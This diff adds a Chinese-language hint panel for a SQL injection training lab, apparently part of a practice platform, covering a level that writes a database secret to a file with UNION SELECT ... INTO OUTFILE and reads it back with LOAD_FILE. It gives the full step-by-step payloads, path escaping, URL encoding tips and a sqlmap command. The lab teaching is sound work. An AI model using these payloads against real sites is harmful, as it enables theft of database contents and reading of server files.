@@ -1,0 +1,41 @@
+<div class="hint-thought">
+<h4>思路提示</h4>
+<p>注入点与 GET 数字型关完全相同：参数 <code>id</code> 直接拼接、查询固定返回 4 列。这一关分两步，两步都只改参数 <code>id</code>：<b>先写入</b>（<code>UNION SELECT ... INTO OUTFILE</code> 把查询结果落地成文件），<b>再读取</b>（<code>UNION SELECT ... LOAD_FILE('路径')</code> 让数据库把文件内容读回页面）。页面不会直接读文件，读回内容只能来自这条注入语句。</p>
+</div>
+<details class="hint-detail">
+<summary>详细解题过程（点击展开）</summary>
+<div>
+<b>1. 确认注入与列数</b><br>
+<code>?id=1 order by 4</code> 正常；<code>?id=1 order by 5</code> 报错 → 当前查询 4 列。<br><br>
+
+<b>2. 判定可写目录（写入前的准备）</b><br>
+<code>?id=-1 UNION SELECT 1,@@secure_file_priv,@@version_compile_os,@@datadir</code><br>
+看到 <code>{{BASE_DIR}}/modules/sqli/files/</code>，说明这是唯一允许读写的目录；<code>Win64</code> 表示目标为 Windows。<br><br>
+
+<b>3. 写入：构造 INTO OUTFILE payload（把通关凭证写进 flag.txt）</b><br>
+构造思路：<code>id</code> 先给一个不会命中的值（如 <code>-1</code>），用 <code>UNION SELECT</code> 补齐 4 列，其中一列放 <code>(SELECT secret FROM secrets WHERE id=1)</code>，
+末尾接 <code>INTO OUTFILE '路径'</code>；路径必须在第 2 步确认的可写目录内，且文件名不能已存在。<br>
+<code>?id=-1 UNION SELECT 1,(SELECT secret FROM secrets WHERE id=1),3,4 INTO OUTFILE '{{BASE_DIR}}/modules/sqli/files/flag.txt'</code><br>
+写入成功后页面会提示「文件已落地」，此时代码框里的查询不会返回数据行。<br><br>
+
+<b>4. 读取：构造 LOAD_FILE payload（通过注入把文件内容读回）</b><br>
+构造思路：同样 4 列 <code>UNION SELECT</code>，把 <code>LOAD_FILE('同一路径')</code> 放在其中一列，执行后文件内容会出现在结果表格里。<br>
+<code>?id=-1 UNION SELECT 1,LOAD_FILE('{{BASE_DIR}}/modules/sqli/files/flag.txt'),3,4</code><br>
+若内容含换行/二进制导致显示不全，可改为十六进制再读（页面同样能识别）：<br>
+<code>?id=-1 UNION SELECT 1,HEX(LOAD_FILE('{{BASE_DIR}}/modules/sqli/files/flag.txt')),3,4</code><br>
+读回内容命中通关凭证后，页面直接显示「通关成功」。<br><br>
+
+<b>5. Windows 路径与斜杠转义（两种写法选其一）</b><br>
+正斜杠（推荐）：<code>'{{BASE_DIR}}/modules/sqli/files/flag.txt'</code><br>
+双反斜杠：<code>'安装路径\\modules\\sqli\\files\\flag.txt'</code>（单写 <code>\d</code> 会被 MySQL 当作转义序列，路径损坏；「安装路径」需替换为你本机的真实部署路径，如 <code>D:\\phpStudy\\WWW\\bafanglab</code>）<br><br>
+
+<b>6. URL 编码注意点（浏览器地址栏 / curl 场景）</b><br>
+单引号 <code>'</code> → <code>%27</code>；空格 → <code>%20</code>（或 <code>+</code>）；双反斜杠 → <code>%5C%5C</code>；
+正斜杠 <code>/</code> 一般无需编码。用 Burp Repeater 直接改原文时不要手动编码，否则会被二次解码。<br><br>
+
+<b>7. 常见失败与重复练习</b><br>
+<code>INTO OUTFILE</code> 不能覆盖已存在的文件，第二次写入会报错误码 1086；点页面上的「清理本关写入的文件」，或换一个文件名再写。
+路径不在 <code>secure_file_priv</code> 目录内会报 1290。<br>
+<b>sqlmap 一句话验证：</b><code>sqlmap -u "{{SITE}}/modules/sqli/outfile.php?id=1" --sql-query "SELECT secret FROM secrets WHERE id=1" --batch</code>
+</div>
+</details>
